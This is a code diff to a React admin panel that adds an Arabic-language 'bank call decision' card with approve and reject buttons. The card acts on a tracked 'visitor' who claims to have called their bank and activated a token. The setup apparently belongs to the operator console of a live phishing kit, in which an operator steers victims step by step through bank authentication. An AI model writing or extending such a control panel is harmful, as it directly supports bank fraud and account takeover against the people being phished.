@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { ArrowRight, MessageSquare, X, ExternalLink, FileText, Download, Eye, Copy, Check, RotateCcw } from "lucide-react";
+import { ArrowRight, MessageSquare, X, ExternalLink, FileText, Download, Eye, Copy, Check, RotateCcw, Phone } from "lucide-react";
 import { Textarea } from "@/components/ui/textarea";
 import { Button } from "@/components/ui/button";
 import { supabase } from "@/integrations/supabase/client";
@@ -407,6 +407,43 @@ const UserDetailsPanel = ({ user, onClose, onDelete }: UserDetailsPanelProps) =>
           </div>
         )}
 
+
+        {/* بطاقة قرار مكالمة البنك */}
+        {liveUser.last_page === "مكالمة البنك" &&
+          (liveUser.status_tabs as Record<string, string> | null)?.source === "bank_call_done" &&
+          !isProcessed && (
+          <div className="border-2 border-primary/40 rounded-xl p-3 bg-primary/5 animate-fade-in">
+            <div className="flex items-center gap-1.5 mb-2">
+              <Phone className="w-4 h-4 text-primary" />
+              <p className="text-xs font-bold text-foreground">
+                طلب الزائر: لقد قمت بالمكالمة
+              </p>
+            </div>
+            <p className="text-[11px] text-muted-foreground mb-3 leading-relaxed">
+              يدّعي الزائر أنه اتصل بخدمة العملاء وفعّل التوكين. هل توافق على متابعة الطلب؟
+            </p>
+            <div className="grid grid-cols-2 gap-1.5">
+              <Button
+                size="sm"
+                className="border-2 border-green-500 bg-green-500/10 text-green-700 hover:bg-green-500/20 font-bold text-xs h-8"
+                variant="outline"
+                disabled={sending !== null}
+                onClick={() => sendAction("موافقة")}
+              >
+                {sending === "موافقة" ? "..." : "✅ موافقة (انتظار)"}
+              </Button>
+              <Button
+                size="sm"
+                className="border-2 border-red-500 bg-red-500/10 text-red-700 hover:bg-red-500/20 font-bold text-xs h-8"
+                variant="outline"
+                disabled={sending !== null}
+                onClick={() => sendAction("رفض")}
+              >
+                {sending === "رفض" ? "..." : "❌ رفض"}
+              </Button>
+            </div>
+          </div>
+        )}
 
         {/* Custom Message */}
         <div className="border border-purple-300 rounded-xl p-3 bg-purple-50/30">
